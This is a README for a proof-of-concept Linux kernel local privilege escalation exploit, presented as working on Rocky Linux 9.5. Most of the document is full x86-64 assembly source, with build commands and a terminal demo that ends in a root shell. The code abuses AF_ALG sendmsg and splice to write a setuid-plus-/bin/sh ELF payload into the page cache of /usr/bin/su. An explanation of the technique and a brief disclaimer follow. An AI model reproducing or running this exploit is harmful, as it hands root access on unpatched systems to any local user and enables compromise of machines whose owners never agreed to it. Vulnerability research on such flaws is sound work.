# Linux AF_ALG Local Privilege Escalation PoC (Rocky Linux 9.5)

**A working local root exploit** for CVE-2026-31431 / Copy Fail, using the
AF_ALG `algif_aead` path with `sendmsg()` and `splice()` to perform controlled
4-byte page-cache writes against `/usr/bin/su`.

Tested and confirmed working on:
- **Rocky Linux 9.5**
- Kernel: `5.14.0-503.40.1.el9_5.x86_64`

## Demo

```bash
Last login: Sun May 10 08:43:00 2026 from 178.197.210.9
[rocky@rockytest ~]$ cd demoo/
[rocky@rockytest demoo]$ ll
total 12
-rw-r--r--. 1 rocky rocky 9947 May 10 08:27 exploit.s
[rocky@rockytest demoo]$ uname -a
Linux rockytest.novalocal 5.14.0-503.40.1.el9_5.x86_64 #1 SMP PREEMPT_DYNAMIC Wed Apr 30 17:38:54 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
[rocky@rockytest demoo]$ id
uid=1000(rocky) gid=1000(rocky) groups=1000(rocky),4(adm),190(systemd-journal) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[rocky@rockytest demoo]$ gcc -nostdlib -no-pie -o exploit exploit.s -lc
[rocky@rockytest demoo]$ cat exploit.s
###### Author: Kaya Ercihan
###### Suffering-Level: High
###### Version: 1.3
###### Description: # this script overwrites /usr/bin/su with shellcode using af_alg splice so we get root
###### Adressing CVE: CVE-2026-31431


.intel_syntax noprefix
.global _start
.global main

.equ SPLICE_LEN,        4
.equ AF_ALG,            38
.equ SOCK_SEQPACKET,    5
.equ SOCKADDR_ALG_LEN,  88

.section .rodata
su_path: .asciz "/usr/bin/su"
su_cmd:  .asciz "su"

alg_type_aead: .asciz "aead"
algo:          .asciz "authencesn(hmac(sha256),cbc(aes))"

fmt_iter:   .asciz "ITER %d\n"
fmt_opfd:   .asciz "opfd=%d offset=%d\n"
fmt_msg:    .asciz "msg_controllen=%d\n"

err_open:                   .asciz "open"
err_pipe:                   .asciz "pipe2"
err_socket:                 .asciz "socket"
err_bind:                   .asciz "bind"
err_setsockopt:             .asciz "setsockopt"
err_accept:                 .asciz "accept"
err_sendmsg:                .asciz "sendmsg"
err_sendmsg_partial:        .asciz "sendmsg partial"
err_splice_file_pipe:       .asciz "splice file->pipe"
err_splice_file_pipe_partial:.asciz "splice file->pipe partial"
err_splice_pipe_alg:        .asciz "splice pipe->af_alg"
err_splice_pipe_alg_partial:.asciz "splice pipe->af_alg partial"

# payload original header + e_entry = 0x400 + shellcode at 0x400
payload:
.byte 0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.byte 0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00
.byte 0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.byte 0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.byte 0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.byte 0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00
.byte 0x9e,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x9e,0x00,0x00,0x00,0x00,0x00,0x00,0x00
.byte 0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xc0,0x31,0xff,0xb0,0x69,0x0f,0x05
.byte 0x48,0x8d,0x3d,0x0f,0x00,0x00,0x00,0x31,0xf6,0x6a,0x3b,0x58,0x99,0x0f,0x05,0x31
.byte 0xff,0x6a,0x3c,0x58,0x0f,0x05,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00
.byte 0x1c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00

    # padding so shellcode at 0x400
    .zero 0x400 - (.-payload)

    # shellcode setuid + execve /bin/sh
    xor eax, eax
    xor edi, edi
    mov al, 0x69
    syscall
    lea rdi, [rip + binsh]
    xor esi, esi
    push 0x3b
    pop rax
    cdq
    syscall
    xor edi, edi
    push 0x3c
    pop rax
    syscall

binsh:
    .asciz "/bin/sh"

    .zero 0x1000 - (.-payload)
payload_end:

key:
    .byte 0x08,0x00,0x01,0x00,0x00,0x00,0x00,0x10
    .zero 64

.section .bss
.align 16
sockaddr_alg_buf: .skip 88
splice_off: .skip 8
pipefd:     .skip 8
msg_area:   .skip 512
last_ret:   .skip 8

.section .text

_start:
    endbr64
    xor ebp, ebp
    mov r9, rdx
    pop rsi
    mov rdx, rsp
    and rsp, -16
    push rax
    push rsp
    xor r8d, r8d
    xor ecx, ecx
    lea rdi, [rip+main]
    call __libc_start_main@PLT
    hlt

main:
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    push r14
    push r15
    sub rsp, 8

    # open /usr/bin/su so we overwrite it
    lea rdi, [rip + su_path]
    xor esi, esi
    call open@PLT
    cmp eax, -1
    je .open_failed
    mov r12d, eax

    xor r15d, r15d

.loop:
    # done writing then run su
    cmp r15d, (payload_end - payload)
    jge .run_su

    mov eax, r15d
    mov QWORD PTR [rip + splice_off], rax

    # make pipe splice needs it
    lea rdi, [rip + pipefd]
    mov esi, 0x80000
    call pipe2@PLT
    cmp eax, -1
    je .pipe_failed

    # af_alg socket this is the trick
    mov edi, AF_ALG
    mov esi, SOCK_SEQPACKET
    xor edx, edx
    call socket@PLT
    cmp eax, -1
    je .socket_failed
    mov r13d, eax

    # zero the sockaddr_alg buffer
    lea rdi, [rip + sockaddr_alg_buf]
    xor eax, eax
    mov ecx, 11
    rep stosq

    # fill sockaddr_alg
    mov WORD PTR [rip + sockaddr_alg_buf + 0x00], AF_ALG
    mov BYTE PTR [rip + sockaddr_alg_buf + 0x02], 'a'
    mov BYTE PTR [rip + sockaddr_alg_buf + 0x03], 'e'
    mov BYTE PTR [rip + sockaddr_alg_buf + 0x04], 'a'
    mov BYTE PTR [rip + sockaddr_alg_buf + 0x05], 'd'
    mov BYTE PTR [rip + sockaddr_alg_buf + 0x06], 0
    mov DWORD PTR [rip + sockaddr_alg_buf + 0x10], 0
    mov DWORD PTR [rip + sockaddr_alg_buf + 0x14], 0

    lea rdi, [rip + sockaddr_alg_buf + 0x18]
    lea rsi, [rip + algo]
    call strcpy@PLT

    # bind the socket
    mov edi, r13d
    lea rsi, [rip + sockaddr_alg_buf]
    mov edx, SOCKADDR_ALG_LEN
    call bind@PLT
    cmp eax, -1
    je .bind_failed

    # set key we have to even if we dont care
    mov edi, r13d
    mov esi, 279
    mov edx, 1
    lea rcx, [rip + key]
    mov r8d, 72
    call setsockopt@PLT
    cmp eax, -1
    je .setsockopt_failed

    # another setsockopt we need
    mov edi, r13d
    mov esi, 279
    mov edx, 5
    xor ecx, ecx
    mov r8d, 4
    call setsockopt@PLT
    cmp eax, -1
    je .setsockopt_failed

    # accept so we get the fd to splice into
    mov edi, r13d
    xor esi, esi
    xor edx, edx
    call accept@PLT
    cmp eax, -1
    je .accept_failed
    mov r14d, eax

    # build msg_area with cmsg this is the hard part
    lea rbx, [rip + msg_area]
    mov rdi, rbx
    xor eax, eax
    mov ecx, 64
    rep stosq

    mov QWORD PTR [rbx + 0x00], 0
    mov QWORD PTR [rbx + 0x08], 0
    lea rax, [rbx + 0x80]
    mov QWORD PTR [rbx + 0x10], rax
    mov QWORD PTR [rbx + 0x18], 1
    lea rax, [rbx + 0x100]
    mov QWORD PTR [rbx + 0x20], rax
    mov QWORD PTR [rbx + 0x28], 88

    lea rax, [rbx + 0x200]
    mov QWORD PTR [rbx + 0x80], rax
    mov QWORD PTR [rbx + 0x88], 8

    mov DWORD PTR [rbx + 0x200], 0x41414141
    mov ecx, r15d
    mov eax, DWORD PTR [payload + rcx]
    mov DWORD PTR [rbx + 0x204], eax

    /* cmsg layout dont touch */
    mov QWORD PTR [rbx + 0x100 + 0x00], 20
    mov DWORD PTR [rbx + 0x100 + 0x08], 279
    mov DWORD PTR [rbx + 0x100 + 0x0c], 3
    mov DWORD PTR [rbx + 0x100 + 0x10], 0

    mov QWORD PTR [rbx + 0x118 + 0x00], 36
    mov DWORD PTR [rbx + 0x118 + 0x08], 279
    mov DWORD PTR [rbx + 0x118 + 0x0c], 2
    mov BYTE  PTR [rbx + 0x118 + 0x10], 0x10
    mov QWORD PTR [rbx + 0x118 + 0x11], 0
    mov QWORD PTR [rbx + 0x118 + 0x19], 0
    mov DWORD PTR [rbx + 0x118 + 0x21], 0

    mov QWORD PTR [rbx + 0x140 + 0x00], 20
    mov DWORD PTR [rbx + 0x140 + 0x08], 279
    mov DWORD PTR [rbx + 0x140 + 0x0c], 4
    mov DWORD PTR [rbx + 0x140 + 0x10], 8

    # debug prints remove later
    lea rdi, [rip + fmt_iter]
    mov esi, r15d
    xor eax, eax
    call printf@PLT

    lea rdi, [rip + fmt_opfd]
    mov esi, r14d
    mov edx, r15d
    xor eax, eax
    call printf@PLT

    lea rdi, [rip + fmt_msg]
    mov esi, 88
    xor eax, eax
    call printf@PLT

    # sendmsg this is where the magic happens
    mov edi, r14d
    lea rsi, [rip + msg_area]
    mov edx, 0x8000
    call sendmsg@PLT
    cmp rax, -1
    je .sendmsg_failed
    cmp rax, 8
    jne .sendmsg_partial

    # splice from su into pipe
    mov edi, r12d
    lea rsi, [rip + splice_off]
    mov edx, DWORD PTR [rip + pipefd + 4]
    xor ecx, ecx
    mov r8d, SPLICE_LEN
    xor r9, r9
    call splice@PLT
    cmp rax, -1
    je .splice_file_pipe_failed
    cmp rax, SPLICE_LEN
    jne .splice_file_pipe_partial

    # splice from pipe into af_alg socket this overwrites the file
    mov edi, DWORD PTR [rip + pipefd]
    xor esi, esi
    mov edx, r14d
    xor ecx, ecx
    mov r8d, SPLICE_LEN
    xor r9, r9
    call splice@PLT
    cmp rax, -1
    je .splice_pipe_alg_failed
    cmp rax, SPLICE_LEN
    jne .splice_pipe_alg_partial

    mov edi, r14d
    lea rsi, [rip + msg_area]
    mov edx, 32
    xor ecx, ecx
    call recv@PLT

    # close everything for this round
    mov edi, r14d
    call close@PLT
    mov edi, r13d
    call close@PLT
    mov edi, DWORD PTR [rip + pipefd]
    call close@PLT
    mov edi, DWORD PTR [rip + pipefd + 4]
    call close@PLT

    add r15d, 4
    jmp .loop

.open_failed:
    lea rdi, [rip + err_open]
    call perror@PLT
    jmp .cleanup_fail

.pipe_failed:
    lea rdi, [rip + err_pipe]
    call perror@PLT
    jmp .cleanup_fail

.socket_failed:
    lea rdi, [rip + err_socket]
    call perror@PLT
    jmp .cleanup_fail

.bind_failed:
    lea rdi, [rip + err_bind]
    call perror@PLT
    jmp .cleanup_fail

.setsockopt_failed:
    lea rdi, [rip + err_setsockopt]
    call perror@PLT
    jmp .cleanup_fail

.accept_failed:
    lea rdi, [rip + err_accept]
    call perror@PLT
    jmp .cleanup_fail

.sendmsg_failed:
    lea rdi, [rip + err_sendmsg]
    call perror@PLT
    jmp .cleanup_fail

.sendmsg_partial:
    mov [rip + last_ret], rax
    lea rdi, [rip + err_sendmsg_partial]
    call puts@PLT
    jmp .cleanup_fail

.splice_file_pipe_failed:
    lea rdi, [rip + err_splice_file_pipe]
    call perror@PLT
    jmp .cleanup_fail

.splice_file_pipe_partial:
    mov [rip + last_ret], rax
    lea rdi, [rip + err_splice_file_pipe_partial]
    call puts@PLT
    jmp .cleanup_fail

.splice_pipe_alg_failed:
    lea rdi, [rip + err_splice_pipe_alg]
    call perror@PLT
    jmp .cleanup_fail

.splice_pipe_alg_partial:
    mov [rip + last_ret], rax
    lea rdi, [rip + err_splice_pipe_alg_partial]
    call puts@PLT
    jmp .cleanup_fail

.cleanup_fail:
    cmp r14d, 0
    jl .skip_opfd
    mov edi, r14d
    call close@PLT
.skip_opfd:

    cmp r13d, 0
    jl .skip_algfd
    mov edi, r13d
    call close@PLT
.skip_algfd:

    mov eax, DWORD PTR [rip + pipefd]
    cmp eax, 0
    jl .skip_pipe_r
    mov edi, eax
    call close@PLT
.skip_pipe_r:

    mov eax, DWORD PTR [rip + pipefd + 4]
    cmp eax, 0
    jl .skip_pipe_w
    mov edi, eax
    call close@PLT
.skip_pipe_w:

    mov edi, 1
    call exit@PLT

.run_su:
    lea rdi, [rip + su_cmd]
    call system@PLT
    xor eax, eax
    leave
    ret
[rocky@rockytest demoo]$ ./exploit
...
msg_controllen=88
ITER 3912
opfd=7 offset=3912
msg_controllen=88
ITER 3916
opfd=7 offset=3916
msg_controllen=88
ITER 3920
opfd=7 offset=3920
msg_controllen=88
ITER 3924
opfd=7 offset=3924
msg_controllen=88
ITER 3928
opfd=7 offset=3928
msg_controllen=88
ITER 3932
opfd=7 offset=3932
msg_controllen=88
ITER 3936
opfd=7 offset=3936
msg_controllen=88
ITER 3940
opfd=7 offset=3940
msg_controllen=88
ITER 3944
opfd=7 offset=3944
msg_controllen=88
ITER 3948
opfd=7 offset=3948
msg_controllen=88
ITER 3952
opfd=7 offset=3952
msg_controllen=88
ITER 3956
opfd=7 offset=3956
msg_controllen=88
ITER 3960
opfd=7 offset=3960
msg_controllen=88
ITER 3964
opfd=7 offset=3964
msg_controllen=88
ITER 3968
opfd=7 offset=3968
msg_controllen=88
ITER 3972
opfd=7 offset=3972
msg_controllen=88
ITER 3976
opfd=7 offset=3976
msg_controllen=88
ITER 3980
opfd=7 offset=3980
msg_controllen=88
ITER 3984
opfd=7 offset=3984
msg_controllen=88
ITER 3988
opfd=7 offset=3988
msg_controllen=88
ITER 3992
opfd=7 offset=3992
msg_controllen=88
ITER 3996
opfd=7 offset=3996
msg_controllen=88
ITER 4000
opfd=7 offset=4000
msg_controllen=88
ITER 4004
opfd=7 offset=4004
msg_controllen=88
ITER 4008
opfd=7 offset=4008
msg_controllen=88
ITER 4012
opfd=7 offset=4012
msg_controllen=88
ITER 4016
opfd=7 offset=4016
msg_controllen=88
ITER 4020
opfd=7 offset=4020
msg_controllen=88
ITER 4024
opfd=7 offset=4024
msg_controllen=88
ITER 4028
opfd=7 offset=4028
msg_controllen=88
ITER 4032
opfd=7 offset=4032
msg_controllen=88
ITER 4036
opfd=7 offset=4036
msg_controllen=88
ITER 4040
opfd=7 offset=4040
msg_controllen=88
ITER 4044
opfd=7 offset=4044
msg_controllen=88
ITER 4048
opfd=7 offset=4048
msg_controllen=88
ITER 4052
opfd=7 offset=4052
msg_controllen=88
ITER 4056
opfd=7 offset=4056
msg_controllen=88
ITER 4060
opfd=7 offset=4060
msg_controllen=88
ITER 4064
opfd=7 offset=4064
msg_controllen=88
ITER 4068
opfd=7 offset=4068
msg_controllen=88
ITER 4072
opfd=7 offset=4072
msg_controllen=88
ITER 4076
opfd=7 offset=4076
msg_controllen=88
ITER 4080
opfd=7 offset=4080
msg_controllen=88
ITER 4084
opfd=7 offset=4084
msg_controllen=88
ITER 4088
opfd=7 offset=4088
msg_controllen=88
ITER 4092
opfd=7 offset=4092
msg_controllen=88
[root@rockytest demoo]# 
[root@rockytest demoo]# id
uid=0(root) gid=1000(rocky) groups=1000(rocky),4(adm),190(systemd-journal) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@rockytest demoo]#
```

**Result**: Unprivileged local user -> root shell via page-cache modification of `/usr/bin/su`.
The resulting process has `uid=0(root)` while the original user's GID may remain preserved.

## How It Works

This PoC targets CVE-2026-31431, also known as **Copy Fail**, a Linux kernel
local privilege escalation issue in the `algif_aead` implementation behind the
`AF_ALG` userspace crypto API.

The exploit does **not** patch `/usr/bin/su` on disk in the normal write-path
sense. Instead, it abuses the kernel crypto path to perform controlled 4-byte
writes into the page cache backing `/usr/bin/su`.

At a high level:

1. Opens `/usr/bin/su`, a readable setuid-root binary.
2. Creates an `AF_ALG` socket using the `aead` type with the
   `authencesn(hmac(sha256),cbc(aes))` transform.
3. Configures the AF_ALG operation with crafted `sendmsg()` control messages.
4. Uses a pipe plus `splice()` to move file-backed pages through the vulnerable
   AF_ALG path.
5. Repeats the operation in 4-byte chunks until a small ELF payload has been
   placed into the page-cache representation of `/usr/bin/su`.
6. Executes `su`, which now resolves through the modified cached image and runs
   the embedded payload.
7. The payload calls `setuid(0)` and then executes `/bin/sh`.

The final shell has `uid=0(root)`, while the original user group may remain
visible, as shown in the demo output.

This behavior is page-cache based and should be treated as destructive for the
test system state. Run only inside disposable VMs or lab systems.

## Files

- `exploit.s`: Pure x86-64 assembly (Intel syntax)
- `exploit`: Compiled binary

## Build Instructions

```bash
gcc -nostdlib -no-pie -o exploit exploit.s -lc
```

```bash
chmod +x exploit
./exploit
```

## Disclaimer

- This is a **proof-of-concept** for educational and research purposes only.
- Use only on systems you own or are authorized to test.
- The exploit works because of a specific kernel behavior present in the tested Rocky Linux 9.5 kernel.

**Tested on**: May 1, 2026

⭐ Feel free to star if this helped your research!
